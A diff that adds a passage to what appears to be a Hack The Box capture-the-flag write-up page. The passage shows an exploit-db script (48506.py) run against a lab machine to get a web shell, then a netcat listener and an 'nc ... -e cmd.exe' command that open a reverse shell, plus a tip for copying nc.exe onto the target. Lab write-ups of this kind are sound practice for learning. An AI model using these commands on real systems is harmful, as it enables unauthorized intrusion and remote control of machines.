@@ -67,6 +67,24 @@ Shellcodes: No Results
 </code></pre>
 					<br>
 					<p class="card-text">This is great news! There is a Remote Code Execution (RCE) exploit ready to be used! Download it, and we can use it to gain a web shell to the server.</p>
+					<br>
+					<pre>
+					<code class="card-text">python2 48506.py http://10.10.10.198:8080/
+            /\
+/vvvvvvvvvvvv \--------------------------------------,
+`^^^^^^^^^^^^ /============BOKU====================="
+            \/
+
+[+] Successfully connected to webshell.
+C:\xampp\htdocs\gym\upload> 
+</code></pre>
+					<br>
+					<p class="card-text">Alright. That right there, my friends, is a web shell. If you run the command <code>dir</code> you will see that netcat, or nc, is already installed. That's amazing for us!</p>
+					<br>
+					<p class="card-text">Okay, so in another terminal, run <code>nc -nlvvp 1337</code>, and in the web shell, run <code>nc [your htb ip] 1337 -e cmd.exe</code></p>
+					<br>
+					<p class="card-text">Boom! We have a reverse shell! Now you can search for the flag, and boom, you have the user flag. (Note: If netcat isn't installed on the web shell, on kali, you can run <code>cp /usr/share/windows-binaries/nc.exe . </code> and it should be on the box.</p>
+			
 				</div>
 			</div>
 
